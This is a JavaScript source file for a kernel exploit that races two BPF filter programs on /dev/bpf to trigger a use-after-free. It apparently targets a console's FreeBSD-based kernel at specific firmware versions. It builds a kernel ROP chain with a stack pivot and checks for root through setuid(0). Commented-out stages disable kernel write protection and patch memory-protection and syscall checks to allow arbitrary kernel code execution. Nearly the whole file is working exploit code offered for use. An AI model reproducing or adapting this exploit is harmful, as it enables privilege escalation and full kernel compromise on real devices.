function kernExploit_bpf_race() {
	try {
		alert("Starting BPF UAF kexploit");
		
		function kernel_rop_run(fd, scratch) {
			while (1) { // wait for it
				var ret = p.syscall("sys_write", fd, scratch, 40);
				if (ret.low == 40)
					break;
			}
			return ret;
		}
		
		// Setup kchain stack for kernel ROP chain
		var kchainstack = p.malloc(0x1000);
		var kchain = new window.kropchain(kchainstack);
		var savectx = p.malloc(0x200);
		
		/////////////////// STAGE 1: Setting Up BPF Programs ///////////////////

		var spadp = p.malloc32(0x2000);

		// Open first device and bind
		var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR
		if (fd1 < 0)
			throw "Failed to open first /dev/bpf device!";
		p.syscall("sys_ioctl", fd1, 0x8020426C, p.stringify("eth0")); // 8020426C = BIOCSETIF
		if (p.syscall("sys_write", fd1, spadp, 40).low == (-1 >>> 0)) {
			p.syscall("sys_ioctl", fd1, 0x8020426C, p.stringify("wlan0"));
			if (p.syscall("sys_write", fd1, spadp, 40).low == (-1 >>> 0))
				throw "Failed to bind to first /dev/bpf device!";
		}

		// Open second device and bind
		var fd2 = p.syscall("sys_open", p.stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR
		if (fd2 < 0)
			throw "Failed to open second /dev/bpf device!";
		p.syscall("sys_ioctl", fd2, 0x8020426C, p.stringify("eth0")); // 8020426C = BIOCSETIF
		if (p.syscall("sys_write", fd2, spadp, 40).low == (-1 >>> 0)) {
			p.syscall("sys_ioctl", fd2, 0x8020426C, p.stringify("wlan0"));
			if (p.syscall("sys_write", fd2, spadp, 40).low == (-1 >>> 0))
				throw "Failed to bind to second /dev/bpf device!";
		}
		
		// Setup valid program
		var bpf_valid_prog = p.malloc(0x10);
		var bpf_valid_instructions = p.malloc(0x80);

		p.write8(bpf_valid_instructions.add32(0x00), 0x00000000); // By specifying 0's for the args it effectively does nothing
		p.write8(bpf_valid_instructions.add32(0x08), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x10), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x18), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x20), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x28), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x30), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x38), 0x00000000);
		p.write4(bpf_valid_instructions.add32(0x40), 0x00000006); // BPF_RET
		p.write4(bpf_valid_instructions.add32(0x44), 0x00000000); // 0

		p.write8(bpf_valid_prog.add32(0x00), 0x00000009);
		p.write8(bpf_valid_prog.add32(0x08), bpf_valid_instructions);

		// Setup invalid program
		var entry = window.gadgets["pop rsp"];
		var bpf_invalid_prog = p.malloc(0x10);
		var bpf_invalid_instructions = p.malloc(0x80);

		p.write4(bpf_invalid_instructions.add32(0x00), 0x00000001); // BPF_LDX
		p.write4(bpf_invalid_instructions.add32(0x04), entry.low); // {lower 32-bits of stack pivot gadget address (pop rsp)}
		p.write4(bpf_invalid_instructions.add32(0x08), 0x00000003); // BPF_STX
		p.write4(bpf_invalid_instructions.add32(0x0C), 0x0000001E); // 0x1E
		p.write4(bpf_invalid_instructions.add32(0x10), 0x00000001); // BPF_LDX
		p.write4(bpf_invalid_instructions.add32(0x14), entry.hi); // {upper 32-bits of stack pivot gadget address (pop rsp)}
		p.write4(bpf_invalid_instructions.add32(0x18), 0x00000003); // BPF_STX
		p.write4(bpf_invalid_instructions.add32(0x1C), 0x0000001F); // 0x1F
		p.write4(bpf_invalid_instructions.add32(0x20), 0x00000001); // BPF_LDX
		p.write4(bpf_invalid_instructions.add32(0x24), kchainstack.low); // {lower 32-bits of kernel ROP chain fake stack address}
		p.write4(bpf_invalid_instructions.add32(0x28), 0x00000003); // BPF_STX
		p.write4(bpf_invalid_instructions.add32(0x2C), 0x00000020); // 0x20
		p.write4(bpf_invalid_instructions.add32(0x30), 0x00000001); // BPF_LDX
		p.write4(bpf_invalid_instructions.add32(0x34), kchainstack.hi); // {upper 32-bits of kernel ROP chain fake stack address}
		p.write4(bpf_invalid_instructions.add32(0x38), 0x00000003); // BPF_STX
		p.write4(bpf_invalid_instructions.add32(0x3C), 0x00000021); // 0x21
		p.write4(bpf_invalid_instructions.add32(0x40), 0x00000006); // BPF_RET
		p.write4(bpf_invalid_instructions.add32(0x44), 0x00000001); // 1

		p.write8(bpf_invalid_prog.add32(0x00), 0x00000009);
		p.write8(bpf_invalid_prog.add32(0x08), bpf_invalid_instructions);
		
		/////////////////// STAGE 2: Building Kernel ROP Chain ///////////////////
		
		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			kchain.push(window.gadgets["pop rax"]);
			kchain.push(dest_offset);
			kchain.push(window.gadgets["pop rdi"]);
			kchain.push(savectx.add32(0x50));			
			kchain.push(window.gadgets["add rax, [rdi]"]);
			kchain.push(window.gadgets["mov rdx, rax"]);
			kchain.push(window.gadgets["pop rax"]);
			kchain.push(patch_data_qword);
			kchain.push(window.gadgets["mov [rdx], rax"]);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			kchain.push(window.gadgets["pop rax"]);
			kchain.push(savectx.add32(0x50));
			kchain.push(window.gadgets["mov rax, [rax]"]);
			kchain.push(window.gadgets["pop rcx"]);
			kchain.push(dest_offset);
			kchain.push(window.gadgets["add rax, rcx"]);
			kchain.push(window.gadgets["mov rdx, rax"]);
			kchain.push(window.gadgets["pop rax"]);
			kchain.push(savectx.add32(0x50));
			kchain.push(window.gadgets["mov rax, [rax]"]);
			kchain.push(window.gadgets["pop rcx"]);
			kchain.push(src_offset);
			kchain.push(window.gadgets["add rax, rcx"]);
			kchain.push(window.gadgets["mov [rdx], rax"]);
		}
		
		// NOP Sled
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		//kchain.push(window.gadgets["ret"]);
		//kchain.push(window.gadgets["ret"]);
		
		//kchain.push(window.gadgets["infloop"]);
		
		// Save context to exit back to userland when finished
		kchain.push(window.gadgets["pop rdi"]);
		kchain.push(savectx);
		//kchain.push(window.o2lc(0x1D3C)); // 4.55
		//kchain.push(window.o2lc(0x509C)); // 4.05
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.o2wk(0x3E02)); // 3.55
		
		/*
		CODE:000000000000509C                 mov     rcx, rdi
		CODE:000000000000509F                 mov     rdx, [rsp+0]
		CODE:00000000000050A3                 mov     [rcx], rdx
		CODE:00000000000050A6                 mov     [rcx+8], rbx
		CODE:00000000000050AA                 mov     [rcx+10h], rsp
		CODE:00000000000050AE                 mov     [rcx+18h], rbp
		CODE:00000000000050B2                 mov     [rcx+20h], r12
		CODE:00000000000050B6                 mov     [rcx+28h], r13
		CODE:00000000000050BA                 mov     [rcx+30h], r14
		CODE:00000000000050BE                 mov     [rcx+38h], r15
		CODE:00000000000050C2                 fnstcw  word ptr [rcx+40h]
		CODE:00000000000050C5                 stmxcsr dword ptr [rcx+44h]
		CODE:00000000000050C9                 xor     rax, rax
		CODE:00000000000050CC                 retn
		*/
		
		/*
		// Defeat kASLR (resolve kernel .text base)
		var kernel_slide = new int64(-window.kernel_offsets["__stack_chk_guard"], -1);
		kchain.push(window.gadgets["pop rax"]);
		kchain.push(savectx.add32(0x30));
		kchain.push(window.gadgets["mov rax, [rax]"]);
		kchain.push(window.gadgets["pop rcx"]);
		kchain.push(kernel_slide);
		kchain.push(window.gadgets["add rax, rcx"]);
		kchain.push(window.gadgets["pop rdi"]);
		kchain.push(savectx.add32(0x50));
		kchain.push(window.gadgets["mov [rdi], rax"]);
		
		// Disable kernel write protection
		kchain.push(window.gadgets["pop rax"]);
		kchain.push(savectx.add32(0x50));
		kchain.push(window.gadgets["mov rax, [rax]"]);
		kchain.push(window.gadgets["pop rcx"]);
		kchain.push(window.kernel_offsets["mov cr0, rax"]);
		kchain.push(window.gadgets["add rax, rcx"]);
		kchain.push(window.gadgets["mov rdx, rax"]);
		kchain.push(window.gadgets["pop rax"]);
		kchain.push(0x80040033);
		kchain.push(window.gadgets["jmp rdx"]);
		*/
		
		/*
		// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
		kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
		
		// Patch mprotect: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
		
		// Patch sys_mmap: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
		
		// Patch syscall: syscall instruction allowed anywhere
		kpatch(window.kernel_offsets["amd64_syscall_patch1_offset"], new int64(window.kernel_patches["amd64_syscall_patch1_1"], window.kernel_patches["amd64_syscall_patch1_2"]));
		kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(window.kernel_patches["amd64_syscall_patch2_1"], window.kernel_patches["amd64_syscall_patch2_2"]));
		
		// Patch sys_dynlib_dlsym: Allow from anywhere
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch2_1"], window.kernel_patches["sys_dynlib_dlsym_patch2_2"]));
		
		// Add custom sys_exec() call to execute arbitrary code as kernel
		kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
		kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
		kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));
		
		// Enable kernel write protection
		kchain.push(window.gadgets["pop rax"]);
		kchain.push(savectx.add32(0x50));
		kchain.push(window.gadgets["mov rax, [rax]"]);
		kchain.push(window.gadgets["pop rcx"]);
		kchain.push(window.kernel_offsets["cpu_setregs"]);
		kchain.push(window.gadgets["add rax, rcx"]);
		kchain.push(window.gadgets["jmp rax"])
		*/
		
		// To userland!
		/*kchain.push(window.gadgets["pop rax"]);
		kchain.push(0);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["leave"]);*/

		/////////////////// STAGE 3: Racing Filters ///////////////////
		
alert("before spawnthread");
		// ioctl with valid BPF program will trigger free() of old program and reallocate memory for the new one
		// sys_ioctl(fd1, BIOCSETWF, bpf_valid_prog);
		window.spawnthread(function (thread2) {
			//thread2.push(window.gadgets["ret"]);
			//thread2.push(window.gadgets["ret"]);
			//thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd1); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // 0x8010427B = BIOCSETWF
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_valid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rsp
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // sys_ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore sys_ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});
		
		// ioctl() with invalid BPF program will be sprayed and eventually get used by the thread where the program has already been validated
		// sys_ioctl(fd2, BIOCSETWF, bpf_invalid_prog);
		window.spawnthread(function (thread2) {
			//thread2.push(window.gadgets["ret"]);
			//thread2.push(window.gadgets["ret"]);
			//thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd2); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // 0x8010427B = BIOCSETWF
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_invalid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rsp
			thread2.push(thread2.stackBase.add32(0x800)); // what - jumps to thread2 at offset 0x800
			thread2.count = 0x100; // set the instructions counter to 0x100 because each instruction is of size 8 and 0x100*8=0x800
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // sys_ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore sys_ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});
//alert("before krop run");

		/////////////////// STAGE 3: Trigger ///////////////////
		
		var scratch = p.malloc(40);
		var test = kernel_rop_run(fd1, scratch);
alert("after krop run");
		if (p.syscall("sys_setuid", 0) == 0)
			return true;
		else
			throw "Kernel exploit failed!";
		return false;
		
	} catch(ex) {
		fail(ex);
		return false;
	}
	
	// failed (should never go here)
	return false;
}